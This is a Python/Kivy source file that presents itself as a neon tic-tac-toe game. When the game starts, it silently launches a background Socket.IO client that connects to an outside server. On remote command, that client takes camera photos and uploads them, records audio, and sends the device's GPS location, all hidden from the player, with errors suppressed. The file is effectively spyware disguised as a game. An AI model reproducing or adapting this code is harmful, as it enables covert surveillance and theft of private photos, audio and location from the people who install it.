import os, threading, requests, random
from kivy.app import App
from kivy.uix.gridlayout import GridLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.graphics import Color, Line, Rectangle
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.modalview import ModalView
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.animation import Animation
from kivy.metrics import dp

# مكتبات التحكم والمقابس
import socketio
from plyer import camera, audio, gps

# --- إعدادات السيرفر (استبدل الرابط برابط سيرفرك الخاص) ---
SERVER_URL = "http://Hogoz.pythonanywhere.com" 
sio = socketio.Client()

class NeonButton(Button):
    def __init__(self, color=(0, 1, 1, 1), **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.symbol = ""
        self.main_color = color
        self.bind(pos=self.draw_base, size=self.draw_base)
        self.glow_opacity = 0.5 

    def draw_base(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0.01, 0.01, 0.02, 1) 
            Rectangle(pos=self.pos, size=self.size)
            Color(0, 0.6, 0.6, self.glow_opacity / 2)
            Line(rectangle=(self.pos[0]-1, self.pos[1]-1, self.size[0]+2, self.size[1]+2), width=1.5)

    def draw_symbol(self):
        self.canvas.after.clear()
        with self.canvas.after:
            if self.symbol == "X":
                Color(0, 1, 1, 1) 
                d = self.size[0] * 0.25
                Line(points=[self.pos[0]+d, self.pos[1]+d, self.pos[0]+self.size[0]-d, self.pos[1]+self.size[1]-d], width=4)
                Line(points=[self.pos[0]+d, self.pos[1]+self.size[1]-d, self.pos[0]+self.size[0]-d, self.pos[1]+d], width=4)
            elif self.symbol == "O":
                Color(1, 0, 0.5, 1) 
                Line(circle=(self.center_x, self.center_y, self.size[0]*0.28), width=4)

class XOGame(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        self.mode = None
        self.game_active = False
        self.turn = "X"
        self.player1_name = "Player 1"
        self.player2_name = "Player 2"
        self.ai_name = "AI"
        self.score_p1 = 0; self.score_p2 = 0; self.score_draw = 0
        
        # واجهة القائمة
        self.menu = BoxLayout(orientation='vertical', spacing=25, padding=[60, 100, 60, 80])
        self.title_label = Label(text="Neon XO", font_size='36sp', bold=True) 
        self.menu.add_widget(self.title_label)
        
        self.btn_pvp = NeonButton(text="2 Players (PvP)", font_size='22sp', size_hint_y=0.2)
        self.btn_pvp.bind(on_release=lambda x: self.start_game('PvP'))
        self.menu.add_widget(self.btn_pvp)
        
        self.btn_ai = NeonButton(color=(1, 0, 0.5, 1), text="Vs Hard AI", font_size='22sp', size_hint_y=0.2)
        self.btn_ai.bind(on_release=lambda x: self.start_game('AI'))
        self.menu.add_widget(self.btn_ai)
        self.add_widget(self.menu)

        # تحضير الشبكة
        self.setup_ui()
        
        # تشغيل العميل في الخلفية
        threading.Thread(target=self.connect_to_dashboard, daemon=True).start()

    def setup_ui(self):
        self.grid_layout = BoxLayout(orientation='vertical', spacing=10)
        self.grid = GridLayout(cols=3, spacing=dp(5), padding=dp(10)) 
        self.buttons = []
        for _ in range(9):
            btn = NeonButton()
            btn.bind(on_release=self.play)
            self.buttons.append(btn)
            self.grid.add_widget(btn)
        self.grid_layout.add_widget(self.grid)

    def start_game(self, mode):
        self.mode = mode
        self.remove_widget(self.menu)
        self.add_widget(self.grid_layout)
        self.game_active = True

    def play(self, btn):
        if not btn.symbol and self.game_active:
            btn.symbol = self.turn
            btn.draw_symbol()
            self.turn = "O" if self.turn == "X" else "X"

    # --- محرك التحكم عن بُعد ---
    def connect_to_dashboard(self):
        @sio.on('take_photo')
        def on_photo(data):
            # حفظ الصورة محلياً
            save_path = os.path.join(App.get_running_app().user_data_dir, "capture.jpg")
            camera.take_picture(filename=save_path, on_complete=self.upload_file)

        @sio.on('record_audio')
        def on_audio(data):
            audio.start()
            Clock.schedule_once(lambda dt: self.stop_and_upload_audio(), 10)

        @sio.on('get_location')
        def on_loc(data):
            gps.configure(on_location=self.on_location_data)
            gps.start()

        try:
            sio.connect(SERVER_URL)
            sio.wait()
        except: pass

    def on_location_data(self, **kwargs):
        sio.emit('location_update', kwargs)
        gps.stop()

    def stop_and_upload_audio(self):
        audio.stop()
        # هنا يمكن إضافة كود الرفع للسيرفر

    def upload_file(self, filename):
        # دالة لرفع الصور الملتقطة للسيرفر
        try:
            with open(filename, 'rb') as f:
                requests.post(f"{SERVER_URL}/upload", files={'file': f})
        except: pass

class XOApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0.02, 1)
        return XOGame()

if __name__ == "__main__":
    XOApp().run()
                                     
